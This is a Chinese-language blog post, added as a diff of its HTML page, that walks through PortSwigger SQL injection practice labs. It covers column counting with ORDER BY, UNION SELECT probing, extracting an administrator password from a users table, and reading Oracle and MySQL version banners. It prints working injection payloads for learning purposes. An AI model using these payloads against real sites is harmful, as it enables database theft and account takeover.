@@ -1,0 +1,995 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="这是回炉重造计划的第一篇-sql基础篇在有一些实战经验之后，应该及时补充知识，巩固自己的基础本系列基于https:&#x2F;&#x2F;portswigger.net&#x2F;web-security&#x2F;all-labs web学习路线对web安全的常见漏洞做一个基础的练习，并将练习心得记录下来。做提前请看(找到sql的部分)https:&#x2F;&#x2F;portswigger.net&#x2F;web-security&#x2F;all-materials">
+<meta property="og:type" content="article">
+<meta property="og:title" content="回炉重造计划之sql">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;04&#x2F;13&#x2F;%E5%9B%9E%E7%82%89%E9%87%8D%E9%80%A0%E8%AE%A1%E5%88%92%E4%B9%8Bsql&#x2F;index.html">
+<meta property="og:site_name" content="irrik&#39;s Blog">
+<meta property="og:description" content="这是回炉重造计划的第一篇-sql基础篇在有一些实战经验之后，应该及时补充知识，巩固自己的基础本系列基于https:&#x2F;&#x2F;portswigger.net&#x2F;web-security&#x2F;all-labs web学习路线对web安全的常见漏洞做一个基础的练习，并将练习心得记录下来。做提前请看(找到sql的部分)https:&#x2F;&#x2F;portswigger.net&#x2F;web-security&#x2F;all-materials">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;04&#x2F;13&#x2F;ycwuBa5sp49zECR.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;04&#x2F;13&#x2F;FfRBmUtsexXQpaL.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;04&#x2F;13&#x2F;UOvb1oukZejp7AG.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;04&#x2F;13&#x2F;rA6kltex8VzSRDc.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;04&#x2F;13&#x2F;rDnhYTNOCGSXZfJ.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;04&#x2F;13&#x2F;5WlVFngECsDN4kt.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;04&#x2F;13&#x2F;Pl9aJcjXvR5FGHS.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;04&#x2F;13&#x2F;mtIfDqvHcQGbLuN.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;04&#x2F;13&#x2F;OVi4gWCZ1MSplLI.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;04&#x2F;13&#x2F;fSn9L1KIU4F5uBp.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;04&#x2F;13&#x2F;Mp6QbDxwcaAWLvu.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;04&#x2F;13&#x2F;uD1MtsVWw8Kvaf4.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;04&#x2F;14&#x2F;2Blp87zkN3FWdwo.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;04&#x2F;14&#x2F;PW7nT3ImFHtohug.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;04&#x2F;14&#x2F;WHQhLDvCUJEBdqT.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;04&#x2F;14&#x2F;6o9BfS574deiIOu.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;04&#x2F;14&#x2F;ER4QoJDhL5wFC8a.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;04&#x2F;14&#x2F;gTrZShNEo4k63vn.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;04&#x2F;14&#x2F;Gh6nT7qa5esDUdM.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;04&#x2F;14&#x2F;6h5w39izCVtLRdT.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;04&#x2F;14&#x2F;yHibTF2YEBrWR4Q.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;04&#x2F;14&#x2F;Iw7asqm1KFhnNHY.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;04&#x2F;14&#x2F;wgJ3vMoTfOe5uxh.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;04&#x2F;14&#x2F;iAyRYjSQwqh836f.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;04&#x2F;14&#x2F;g5wMYnPNXDvzSqh.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;04&#x2F;14&#x2F;4zMKAcIBRnJLaQU.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;04&#x2F;14&#x2F;DJin2sxV3ryuhW6.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;04&#x2F;14&#x2F;1QsZ7RpflMHBhqv.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;04&#x2F;14&#x2F;yMTOcRz7kYVWISm.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;04&#x2F;14&#x2F;3RxnsK4q5OINPig.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;04&#x2F;14&#x2F;GCq6tzF8g5RfY1W.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;04&#x2F;14&#x2F;J3zWwKtCZbLAsio.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;04&#x2F;14&#x2F;8lgHrdmSDsvN1nh.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;04&#x2F;14&#x2F;2RHEeLK1865Zd4l.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;04&#x2F;14&#x2F;KmMNaB4ShDsWV1e.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;04&#x2F;14&#x2F;5x1FrfLUGmBNEPC.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;04&#x2F;14&#x2F;nj2Pi6qEBXIKpTD.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;04&#x2F;14&#x2F;pOCzjTFh4G6m7Qw.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;04&#x2F;14&#x2F;ogC3OheAtz962lL.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;04&#x2F;14&#x2F;7Od2Moe3z6qtSyH.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;04&#x2F;14&#x2F;jZJxl8syVnpzeiD.png">
+<meta property="og:updated_time" content="2021-04-15T09:35:52.786Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;04&#x2F;13&#x2F;ycwuBa5sp49zECR.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2021/04/13/回炉重造计划之sql/"/>
+
+
+
+
+
+  <title>回炉重造计划之sql | irrik's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">irrik's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">夏天要过去了</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/04/13/%E5%9B%9E%E7%82%89%E9%87%8D%E9%80%A0%E8%AE%A1%E5%88%92%E4%B9%8Bsql/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="irrik">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://i.loli.net/2019/11/10/UuWBRD8EjChrNIi.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="irrik's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">回炉重造计划之sql</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-04-13T15:18:01+08:00">
+                2021-04-13
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  6k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  27
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><strong>这是回炉重造计划的第一篇-sql基础篇</strong><br>在有一些实战经验之后，应该及时补充知识，巩固自己的基础<br>本系列基于<a href="https://portswigger.net/web-security/all-labs" target="_blank" rel="noopener">https://portswigger.net/web-security/all-labs</a> web学习路线<br>对web安全的常见漏洞做一个基础的练习，并将练习心得记录下来。<br>做提前请看(找到<code>sql</code>的部分)<br><a href="https://portswigger.net/web-security/all-materials" target="_blank" rel="noopener">https://portswigger.net/web-security/all-materials</a></p>
+<h1 id="SQL-injection-UNION-attack-determining-the-number-of-columns-returned-by-the-query"><a href="#SQL-injection-UNION-attack-determining-the-number-of-columns-returned-by-the-query" class="headerlink" title="SQL injection UNION attack, determining the number of columns returned by the query"></a>SQL injection UNION attack, determining the number of columns returned by the query</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><blockquote>
+<p>To solve the lab, determine the number of columns returned by the query by performing an SQL injection UNION attack that returns an additional row containing null values</p>
+</blockquote>
+<p>这题就是要我们做一个UNION SELECT，联合查询，查询结果里有NULL就算过了。<br>注入点在产品类别种。</p>
+<h2 id="确定注入点"><a href="#确定注入点" class="headerlink" title="确定注入点"></a>确定注入点</h2><p>这边通过一个单引号，引起sql语句闭合问题，回显不正常<br><img src="https://i.loli.net/2021/04/13/ycwuBa5sp49zECR.png" alt="1.png"><br>再加一个单引号，发现回显正常了<br><img src="https://i.loli.net/2021/04/13/FfRBmUtsexXQpaL.png" alt="1.png"><br>其实在实战中也经常使用这种方法来判断一个参数存不存在注入<br>当给参数加上一个单引号发现回显不正常<br>再加一个(1+1现在加了2个单引号了)发现回显正常<br>大概率可以判断此参数存在sql注入问题<br>可以猜测后端sql语句大致为</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">column</span> <span class="keyword">from</span> table_name <span class="keyword">where</span> column_name=<span class="string">'Gifts'</span>  <span class="comment"># 原始</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">column</span> <span class="keyword">from</span> table_name <span class="keyword">where</span> column_name=<span class="string">'Gifts''  # 一个引号，没有闭合，出错</span></span><br><span class="line"><span class="string">select column from table_name where column_name='</span>Gifts<span class="string">'''  # 两个引号，闭合起来了，没有问题</span></span><br></pre></td></tr></table></figure>
+<h2 id="确定列数"><a href="#确定列数" class="headerlink" title="确定列数"></a>确定列数</h2><p>由于这一题要求是用UNION SELECT来使页面返回一个NULL值算过关<br>UNION SELECT使用的前提是联合查询的列数和前面查询的列数相同。<br>基本上主流的关系型数据库都可以通过ORDER BY的方式来查询列数<br><img src="https://i.loli.net/2021/04/13/UOvb1oukZejp7AG.png" alt="1.png"><br>注意这里<br><code>order by 3--</code><br>后边多了两个<code>--</code>符号，一般新手在做sql注入学习的时候<br>由于对sql语句闭合的问题不太熟练，经常会忘记闭合sql语句导致执行出现问题。<br>而且由于自己也不是一开始学习的新手了，这里其实省略了确定后端DBMS的过程。<br>(一般来说，要先确定DBMS类型，才好针对性的进行测试)<br>不过从<code>--</code>作为注释符没问题来看，首先排除了MYSQL的可能<br>不过这里不确定DBMS类型其实问题不是很大<br>继续通过ORDER BY确定列数，当数字大于查询的列数的时候会报错<br>由此可以确定原本的SELECT 语句查询了几列数据(这里查询出的列数就是3)</p>
+<hr>
+<p>UNION SELECT的数据类型要和原本的数据类型兼容，不然会报错。<br>这里推荐使用NULL来测试，因为能和所有数据都兼容</p>
+<h2 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h2><p>上面确定了列数为3，接下来可以通过<br><code>UNION SELECT NULL,NULL,NULL--</code>来进行联合查询(注意注释符的闭合作用)<br><img src="https://i.loli.net/2021/04/13/rA6kltex8VzSRDc.png" alt="1.png"></p>
+<h1 id="SQL-injection-UNION-attack-finding-a-column-containing-text"><a href="#SQL-injection-UNION-attack-finding-a-column-containing-text" class="headerlink" title="SQL injection UNION attack, finding a column containing text"></a>SQL injection UNION attack, finding a column containing text</h1><h2 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h2><blockquote>
+<p>The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform an SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data.</p>
+</blockquote>
+<p>这题需要我们做一个UNION SELECT，并且要让数据库收到一串字符串才算过关。<br>实际上就是要我们自己判断出一个是字符类型的字段(也是这一道题的主要目的)<br>注入点在产品类别种。</p>
+<hr>
+<p>确定注入点存在的过程这一个系列都是一样的，就不再一次次的去写了。</p>
+<h2 id="确定列数-1"><a href="#确定列数-1" class="headerlink" title="确定列数"></a>确定列数</h2><p>利用ORDER BY的方式确定列数(再说一次注意闭合的问题)<br>3的时候不报错<br><img src="https://i.loli.net/2021/04/13/rDnhYTNOCGSXZfJ.png" alt="4.png"><br>4的时候报错了<br><img src="https://i.loli.net/2021/04/13/5WlVFngECsDN4kt.png" alt="2.png"><br>由此确认原来的select查询列数为3</p>
+<h2 id="确定兼容字符串的列"><a href="#确定兼容字符串的列" class="headerlink" title="确定兼容字符串的列"></a>确定兼容字符串的列</h2><p>确定的方法其实也比较简单<br>通过一列一列的替换一个</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">UNION <span class="keyword">SELECT</span> <span class="string">'A'</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span><span class="comment">-- //报错，说明第一列和字符不兼容</span></span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="literal">NULL</span>,<span class="string">'A'</span>,<span class="literal">NULL</span><span class="comment">-- //正常，说明第二列可以回显字符类型</span></span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="string">'A'</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>
+<p>通过这样筛选出一个可以和字符串兼容的列<br>然后填入生成的随机字符串(这里的随机字符串是随机生成的)<br><img src="https://i.loli.net/2021/04/13/Pl9aJcjXvR5FGHS.png" alt="1.png"></p>
+<h1 id="SQL-injection-UNION-attack-retrieving-data-from-other-tables"><a href="#SQL-injection-UNION-attack-retrieving-data-from-other-tables" class="headerlink" title="SQL injection UNION attack, retrieving data from other tables"></a>SQL injection UNION attack, retrieving data from other tables</h1><h2 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h2><blockquote>
+<p>The database contains a different table called users, with columns called username and password.<br>To solve the lab, perform an SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator use</p>
+</blockquote>
+<p>需要从users表中提取出administrator的密码，以administrator的身份登录就算过关<br>注入点在产品种类</p>
+<h2 id="确定列数-2"><a href="#确定列数-2" class="headerlink" title="确定列数"></a>确定列数</h2><p>同样是用ORDER BY </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ORDER BY 3<span class="comment">-- //错误</span></span><br><span class="line">ORDER BY 2<span class="comment">-- //正常</span></span><br></pre></td></tr></table></figure>
+<p>其实这里猜也能猜出来是2列。因为users表是有两列数据(username,password)</p>
+<h2 id="确定能回显字符串的列"><a href="#确定能回显字符串的列" class="headerlink" title="确定能回显字符串的列"></a>确定能回显字符串的列</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">UNION+<span class="keyword">SELECT</span>+<span class="string">'A'</span>,<span class="literal">NULL</span><span class="comment">-- //正常，说明第一列能回显字符串</span></span><br><span class="line"><span class="keyword">UNION</span>+<span class="keyword">SELECT</span>+<span class="literal">NULL</span>,<span class="string">'A'</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>
+<p>随后根据能回显字符串的列进行密码查询即可。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNION+<span class="keyword">SELECT</span>+<span class="keyword">password</span>,<span class="literal">NULL</span>+<span class="keyword">FROM</span>+<span class="keyword">users</span>+<span class="keyword">where</span>+username=%<span class="number">27</span>administrator%<span class="number">27</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>
+<p>这里稍微提一下,加号在url中是可以当作空格来使用的<br>可以看到密码回显了<br><img src="https://i.loli.net/2021/04/13/mtIfDqvHcQGbLuN.png" alt="1.png"></p>
+<h1 id="SQL-injection-UNION-attack-retrieving-multiple-values-in-a-single-column"><a href="#SQL-injection-UNION-attack-retrieving-multiple-values-in-a-single-column" class="headerlink" title="SQL injection UNION attack, retrieving multiple values in a single column"></a>SQL injection UNION attack, retrieving multiple values in a single column</h1><h2 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h2><blockquote>
+<p>The database contains a different table called users, with columns called username and password.<br>To solve the lab, perform an SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.</p>
+</blockquote>
+<p>和前一题一样，这题也需要找到administrator的密码并登录</p>
+<h2 id="确定列数-3"><a href="#确定列数-3" class="headerlink" title="确定列数"></a>确定列数</h2><p>这个是能用UNION SELECT的基本操作<br>当然有些人比较莽，他不ORDER BY<br>他直接UNION SELECT 然后一列一列的加<br>也可以，看个人喜好。<br>这里就可以通过ORDER BY 判断出存在2列</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ORDER BY 2<span class="comment">-- //正常</span></span><br><span class="line">ORDER BY 3<span class="comment">-- //错误</span></span><br></pre></td></tr></table></figure>
+<h2 id="判断可以回显字符串的列"><a href="#判断可以回显字符串的列" class="headerlink" title="判断可以回显字符串的列"></a>判断可以回显字符串的列</h2><p>还是相同的方法</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">UNION+<span class="keyword">SELECT</span>+<span class="string">'A'</span>,<span class="literal">NULL</span><span class="comment">-- //异常</span></span><br><span class="line"><span class="keyword">UNION</span>+<span class="keyword">SELECT</span>+<span class="literal">NULL</span>,<span class="string">'A'</span><span class="comment">-- //正常，说明第二列能回显字符串</span></span><br></pre></td></tr></table></figure>
+<p>然后就</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNION+<span class="keyword">SELECT</span>+<span class="literal">NULL</span>,<span class="keyword">password</span>+<span class="keyword">FROM</span>+<span class="keyword">users</span>+<span class="keyword">where</span>+username=%<span class="number">27</span>administrator%<span class="number">27</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>
+<p>这个好像没搞懂他的意义，，感觉和前一题都用一样的方法能做的<br><img src="https://i.loli.net/2021/04/13/OVi4gWCZ1MSplLI.png" alt="1.png"><br>学习一下官方的解法<br><img src="https://i.loli.net/2021/04/13/fSn9L1KIU4F5uBp.png" alt="1.png"><br>这里用了多个字段拼接在一起的方式来读数据<br>用这种办法其实还需要确定一下DBMS是什么<br>因为不同DBMS拼接字符串的方式有差异<br><img src="https://i.loli.net/2021/04/13/Mp6QbDxwcaAWLvu.png" alt="1.png"></p>
+<h1 id="SQL-injection-attack-querying-the-database-type-and-version-on-Oracle"><a href="#SQL-injection-attack-querying-the-database-type-and-version-on-Oracle" class="headerlink" title="SQL injection attack, querying the database type and version on Oracle"></a>SQL injection attack, querying the database type and version on Oracle</h1><h2 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h2><blockquote>
+<p>This lab contains an SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.<br>To solve the lab, display the database version string.</p>
+</blockquote>
+<p>查出数据库版本算过关。已经告诉了我们DBMS是Oracle并且可以用UNION SELECT</p>
+<h2 id="判断列"><a href="#判断列" class="headerlink" title="判断列"></a>判断列</h2><p>ORDER BY大法<br>这里可以通过ORDER BY 判断出存在2列</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ORDER BY 2<span class="comment">-- //正常</span></span><br><span class="line">ORDER BY 3<span class="comment">-- //错误</span></span><br></pre></td></tr></table></figure>
+<h2 id="判断可以回显字符串的列-1"><a href="#判断可以回显字符串的列-1" class="headerlink" title="判断可以回显字符串的列"></a>判断可以回显字符串的列</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">UNION+<span class="keyword">SELECT</span> <span class="string">'A'</span>,<span class="literal">NULL</span>+<span class="keyword">FROM</span>+DUAL<span class="comment">-- //正常，说明第一列可以回显字符串</span></span><br><span class="line"><span class="keyword">UNION</span>+<span class="keyword">SELECT</span> <span class="literal">NULL</span>,<span class="string">'A'</span>+<span class="keyword">FROM</span>+DUAL<span class="comment">--</span></span><br></pre></td></tr></table></figure>
+<p>ORACLE比较特殊，他的select后边一定要接一个表<br>不过好在有一个公共的表dual，方便了注入的时候使用<br>在ORACLE里面查版本可以这么查</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> banner <span class="keyword">FROM</span> v$<span class="keyword">version</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">version</span> <span class="keyword">FROM</span> v$<span class="keyword">instance</span></span><br></pre></td></tr></table></figure>
+<p>在这里可以用来查询</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNION <span class="keyword">SELECT</span> banner,<span class="literal">NULL</span> <span class="keyword">FROM</span> v$<span class="keyword">version</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>
+<p>成功查到版本<br><img src="https://i.loli.net/2021/04/13/uD1MtsVWw8Kvaf4.png" alt="1.png"></p>
+<h1 id="SQL-injection-attack-querying-the-database-type-and-version-on-MySQL-and-Microsoft"><a href="#SQL-injection-attack-querying-the-database-type-and-version-on-MySQL-and-Microsoft" class="headerlink" title="SQL injection attack, querying the database type and version on MySQL and Microsoft"></a>SQL injection attack, querying the database type and version on MySQL and Microsoft</h1><h2 id="题目描述-5"><a href="#题目描述-5" class="headerlink" title="题目描述"></a>题目描述</h2><blockquote>
+<p>This lab contains an SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.<br>To solve the lab, display the database version string.</p>
+</blockquote>
+<p>这里说了可以使用UNION SELECT，题目也说了要查版本(不过这次要查的是MySQL和mssql)</p>
+<h2 id="确定列数-4"><a href="#确定列数-4" class="headerlink" title="确定列数"></a>确定列数</h2><p>万年不变的ORDER BY</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ORDER+BY+2<span class="comment">--+ // 正常，MySQL中，--+（这里+在url中解释为空格)为单行注释</span></span><br><span class="line">ORDER+BY+3<span class="comment">--+ //错误</span></span><br></pre></td></tr></table></figure>
+<p>由此确定有两列数据</p>
